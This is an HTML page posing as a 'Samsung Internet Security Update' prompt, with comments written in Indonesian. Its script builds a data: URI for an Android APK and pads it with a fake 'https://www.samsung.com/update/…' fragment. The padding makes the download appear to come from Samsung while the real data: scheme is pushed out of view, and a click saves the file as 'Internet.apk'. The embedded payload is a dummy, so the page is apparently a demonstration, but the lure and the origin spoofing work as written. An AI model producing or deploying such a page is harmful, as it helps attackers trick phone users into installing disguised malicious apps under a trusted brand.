<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samsung Internet Security Update</title>
    <style>
        body { background: #0b0b0b; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 50px; }
        .container { border: 1px solid #0078d4; padding: 30px; display: inline-block; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px rgba(0, 120, 212, 0.2); }
        .brand-logo { color: #0078d4; font-size: 3em; font-weight: bold; margin-bottom: 10px; }
        .warning { color: #44baff; font-weight: bold; font-size: 1.1em; margin-bottom: 20px; }
        #installBtn {
            padding: 15px 35px;
            background: #0078d4;
            color: #fff;
            border: none;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.1em;
            border-radius: 8px;
            transition: 0.3s;
        }
        #installBtn:hover { background: #005a9e; transform: scale(1.05); }
        #status { margin-top: 25px; font-size: 0.8em; color: #888; font-family: monospace; }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand-logo">🌐</div>
        <div class="warning">Browser Update Required</div>
        <p>A critical security patch for Samsung Internet is ready.</p>
                
        <button type="button" id="installBtn">
            Update Internet Browser
        </button>
        <div id="status">> SYSTEM_READY: Pending user verification...</div>
    </div>

<script>
    document.getElementById('installBtn').addEventListener('click', function() {
        // --- 1. CONFIGURATION ---
        const filename = "Internet.apk"; // Nama file diganti sesuai permintaan
        const realDomain = "www.samsung.com";
                
        // --- 2. ADVANCED SPOOFING LOGIC ---
        // Padding masif untuk mendorong skema data: keluar dari tampilan UI
        const padding = "/update/".repeat(30);
        const longSub = realDomain + padding;

        // --- 3. PAYLOAD CONSTRUCTION ---
        // Dummy Base64 (Hanya untuk demonstrasi)
        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
        const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#https://${longSub}`;

        // --- 4. EXECUTION ---
        const a = document.createElement('a');
        a.href = payload;
        a.download = filename;
        a.rel = "noopener";
                
        document.body.appendChild(a);
        a.click();
                
        document.getElementById('status').innerText = "> INJECTING_ORIGIN: " + realDomain;

        // --- 5. CLEANUP ---
        setTimeout(() => {
            document.body.removeChild(a);
        }, 1500);
    });
</script>
</body>
</html>
